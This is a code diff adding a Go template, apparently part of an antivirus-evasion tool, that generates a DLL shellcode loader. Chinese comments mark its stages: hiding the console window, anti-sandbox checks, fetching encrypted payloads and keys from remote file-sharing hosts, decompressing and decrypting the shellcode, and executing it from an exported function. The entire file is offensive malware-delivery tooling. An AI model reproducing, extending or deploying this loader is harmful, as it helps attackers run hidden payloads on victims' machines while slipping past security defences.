@@ -1,0 +1,111 @@
+package main
+
+import (
+    "variant/crypto"
+    "variant/loader"
+    "C"
+    {{if .Compressor}}
+        "{{.Compressor.Import}}"
+    {{end}}
+
+	{{if .Dynamic}}
+         "{{.Dynamic.Import}}"
+    {{end}}
+
+	{{if .SandBox}}
+	    "{{.SandBox.Import}}"
+	{{end}}
+
+	{{if .Args}}
+    	 "{{.Args.Import}}"
+    {{end}}
+)
+
+func init() {
+    {{/* 代码层面隐藏CMD */}}
+    {{if .Loader.Hide}}
+	    {{.Loader.Hide}}()
+    {{end}}
+
+    {{/* 反沙箱 */}}
+    {{if .SandBox}}
+        {{range .SandBox.Methods}}
+            {{.}}()
+	    {{end}}
+	{{end}}
+}
+
+//export {{ .DllFunc }}
+func {{ .DllFunc }}() {
+    {{/* 是否为本地加载模式 */}}
+    {{if .Local}}
+        {{/* 是否为硬编码, 如有存在 Local.KeyName 则渲染 */}}
+        {{if .Local.KeyName}}
+            {{.Local.KeyName}} := []byte("{{.Local.KeyValue}}")
+        {{end}}
+
+        {{/* 是否为硬编码, 如有存在 Local.IvName 则渲染 */}}
+        {{if .Local.IvName}}
+             {{.Local.IvName}}  := []byte("{{.Local.IvValue}}")
+        {{end}}
+    {{end}}
+
+    {{/* 常规本地加载 */}}
+    {{if .Local}}
+        {{.CipherText}} := "{{.Local.Payload}}"
+
+        {{/* 是否需要解压 shellcode */}}
+        {{if .Compressor}}
+            {{.CipherText}}, _ = {{.Compressor.Algorithm}}([]byte({{.CipherText}}), {{.Compressor.Ratio}})
+        {{end}}
+
+        {{.PlainText}}, _ := {{.DecryptMethod}}(
+            {{.CipherText}},
+            {{if .Local.KeyName}} {{.Local.KeyName}}, {{end}}
+            {{if .Local.IvName}}  {{.Local.IvName}}   {{end}})
+    {{end}}
+
+    {{/* Pokemon 本地加载 */}}
+    {{if .Pokemon}}
+        {{.CipherText}} := []string{
+            {{range .Pokemon}}"{{.}}",
+            {{end}}
+        }
+        {{.PlainText}}  := {{.DecryptMethod}}({{.CipherText}})
+    {{end}}
+
+    {{/* 远程动态 Key IV */}}
+    {{if .Dynamic}}
+        {{/* 是否为远程动态 Key */}}
+        {{if .Dynamic.DynamicKey}}
+            {{.Dynamic.DynamicKey}} := {{.Dynamic.DynamicMethod}}("{{.Dynamic.DynamicUrl}}",{{.Dynamic.KeyStart}},{{.Dynamic.KeyEnd}})
+        {{end}}
+
+        {{/* 是否为远程动态 IV */}}
+        {{if .Dynamic.DynamicIV}}
+            {{.Dynamic.DynamicIV}} := {{.Dynamic.DynamicMethod}}("{{.Dynamic.DynamicUrl}}",{{.Dynamic.IVStart}},{{.Dynamic.IVEnd}})
+        {{end}}
+    {{end}}
+
+    {{/* 远程加载 */}}
+        {{if .Remote}}
+            {{/* Transfer, FileIO 远程加载 */}}
+            {{if .Remote.Method}}
+                {{.CipherText}} := {{.Remote.Method}}("{{.Remote.Url}}")
+
+            {{/* UsersCloud 远程加载 */}}
+            {{else if .Remote.UCFileCode}}
+                 {{.CipherText}} := {{.Remote.UCMethod}}("{{.Remote.UCFileCode}}")
+        {{end}}
+    {{end}}
+
+    {{/* 远程加载 动态解密 */}}
+    {{if .Dynamic}}
+        {{.PlainText}}, _ := {{.DecryptMethod}}({{.CipherText}}, {{.Dynamic.DynamicKey}} {{if .Dynamic.DynamicIV}}, {{.Dynamic.DynamicIV}} {{end}})
+    {{end}}
+
+    {{/* 执行 shellcode */}}
+    {{.Loader.Method}}({{.PlainText}})
+}
+
+func main(){}
